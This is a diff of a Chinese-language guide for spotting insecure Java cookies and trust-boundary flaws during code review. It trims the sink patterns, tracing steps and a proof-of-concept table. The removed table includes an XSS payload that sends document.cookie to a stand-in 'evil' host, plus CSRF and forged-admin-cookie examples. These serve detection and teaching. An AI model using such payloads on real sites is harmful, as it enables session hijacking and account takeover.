@@ -1,27 +1,5 @@
 # Cookie & Trust Boundary Family（Insecure Cookie / Trust Boundary Violation）
 
-## sink 模式速查
-
-### Insecure Cookie
-- `new Cookie(name, value)` 后未调 `setSecure(true)` + `setHttpOnly(true)` 即 `addCookie`
-- 显式 `cookie.setSecure(false)` / `cookie.setHttpOnly(false)`
-- `ResponseCookie.from(...).secure(false).httpOnly(false).build()`
-- 配置 `server.servlet.session.cookie.secure=false` (Spring Boot)
-
-### Trust Boundary Violation
-- 把用户输入直接存到 `HttpSession` 不做校验，后续读出来用作信任决策
-- 把外部 token / cookie 内容当作"已认证身份"使用而不验证
-
-## 数据流追溯重点
-
-### Insecure Cookie
-fast-path：看 Cookie 构造后 `addCookie` 之前**是否**有 `setSecure(true)` + `setHttpOnly(true)`。
-
-### Trust Boundary
-1. 找 `session.setAttribute("trustedXxx", request.getParameter(...))` 模式；
-2. 看 setAttribute 时**是否**做了校验 / 类型转换；
-3. 后续 `session.getAttribute("trustedXxx")` 是否被用作权限决策。
-
 ## 防御机制速查
 
 ### Cookie
@@ -75,12 +53,3 @@ suspicion_reason: "Line 58 Cookie cookie = new Cookie(\"auth-token\", jwt);
                   — 未调 setSecure / setHttpOnly,Cookie 可在 HTTP 明文中泄露,
                   且 JS 可通过 document.cookie 读到,XSS 时直接获 token."
 ```
-
-## PoC 模板
-
-| 弱点 | 攻击思路 |
-|---|---|
-| 无 Secure | 中间人在 HTTP 链路嗅探 Cookie (公共 WiFi / 同子网 ARP 攻击) |
-| 无 HttpOnly | 配合 XSS：`<script>fetch('//evil/?'+document.cookie)</script>` |
-| 无 SameSite | CSRF：诱导受害者访问 `<img src="https://victim.com/api/transfer?...">` |
-| Trust Boundary | 把 `Cookie["isAdmin"]=true` 直接信任的应用，前端伪造 Cookie 即升级权限 |
